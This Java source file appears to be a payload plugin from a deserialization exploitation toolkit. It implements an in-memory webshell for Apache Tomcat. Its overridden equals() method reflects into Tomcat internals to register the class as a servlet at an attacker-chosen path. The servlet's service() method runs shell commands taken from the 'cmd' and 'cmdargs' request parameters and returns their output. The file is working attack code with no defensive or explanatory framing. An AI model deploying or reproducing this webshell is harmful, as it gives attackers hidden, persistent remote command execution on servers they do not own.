package sample.deser.plugins.servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.*;
import java.text.SimpleDateFormat;


public class SpringExecDempServlet extends HttpServlet {
    private String path;
    String cs;

    public void init(ServletConfig paramServletConfig) throws ServletException {
    }


    boolean isWin() {
        String osname = (String) System.getProperty("os.name");
        osname = osname.toLowerCase();
        if (osname.startsWith("win"))
            return true;
        return false;
    }

    String ExecuteCommandCode(String cmdPath, String command) throws Exception {
        StringBuffer sb = new StringBuffer("");
        String[] c = {cmdPath, !isWin() ? "-c" : "/c", command};
        Process p = Runtime.getRuntime().exec(c);
        CopyInputStream(p.getInputStream(), sb);
        CopyInputStream(p.getErrorStream(), sb);
        return sb.toString();
    }

    String getEncoding(String str) {
        String encode[] = new String[]{
                "UTF-8",
                "ISO-8859-1",
                "GB2312",
                "GBK",
                "GB18030",
                "Big5",
                "Unicode",
                "ASCII"
        };
        for (int i = 0; i < encode.length; i++) {
            try {
                if (str.equals(new String(str.getBytes(encode[i]), encode[i]))) {
                    return encode[i];
                }
            } catch (Exception ex) {
            }
        }

        return "";
    }


    void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
        br.close();
    }

    public void service(ServletRequest arg0, ServletResponse arg1) throws ServletException, IOException {
        HttpServletRequest request;
        HttpServletResponse response;
        request = (HttpServletRequest) arg0;
        response = (HttpServletResponse) arg1;
        try {
            HttpSession session = request.getSession();
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            StringBuffer output = new StringBuffer("");
            StringBuffer sb = new StringBuffer("");

            try {
                String z1 = request.getParameter("cmd");
                String z2 = request.getParameter("cmdargs");
                String[] pars = {z1, z2};

                sb.append(ExecuteCommandCode(pars[0], pars[1]));
            } catch (Exception e) {
                sb.append("ERROR" + ":// " + e.toString());
            }
            try {
                output.append(sb.toString());
            } catch (Exception e) {
                sb.append("ERROR" + ":// " + e.toString());
            }
            response.getWriter().write(output.toString());
            response.getWriter().flush();
            response.getWriter().close();
        } catch (ClassCastException var6) {
            throw new ServletException("non-HTTP request or response");
        } catch (Exception e) {
            try {
                StackTraceElement[] stackTraceElementArray = e.getStackTrace();
                StringBuffer sb = new StringBuffer();
                for (StackTraceElement stackTraceElement : stackTraceElementArray) {
                    sb.append(stackTraceElement.toString()).append("\n");
                }
                response.getWriter().write(sb.toString());
                response.getWriter().flush();
                response.getWriter().close();
            } catch (IOException ioException) {
                ;
            }
        }
    }

    // init
    @Override
    public boolean equals(Object conreq) {
        Request request = (Request) conreq;
        Response response = request.getResponse();
        try {
//            ServletContext servletContext = (ServletContext) getContext();
            ServletContext servletContext = request.getServletContext();
            this.path = request.getParameter("path");
            cs = "UTF-8";

            if (servletContext != null) {
                dynamicAddServlet(servletContext);
                response.getWriter().write("dynamic inject success");
                response.getWriter().flush();
                response.getWriter().close();
            } else {
                response.getWriter().write("dynamic inject failed");
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Exception e) {
            try {
                StackTraceElement[] stackTraceElementArray = e.getStackTrace();
                StringBuffer sb = new StringBuffer();
                for (StackTraceElement stackTraceElement : stackTraceElementArray) {
                    sb.append(stackTraceElement.toString()).append("\n");
                }
                response.getWriter().write(sb.toString());
                response.getWriter().flush();
                response.getWriter().close();
            } catch (IOException ioException) {
                ;
            }
        }


        return true;
    }

    public void dynamicAddServlet(ServletContext servletContext) throws Exception {

        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);

        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName(path);
        standardContext.addChild(wrapper);

        wrapper.setServletClass(this.getClass().getName());
        wrapper.setServlet(this);

        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
        registration.addMapping(path);
        registration.setLoadOnStartup(1);
    }
}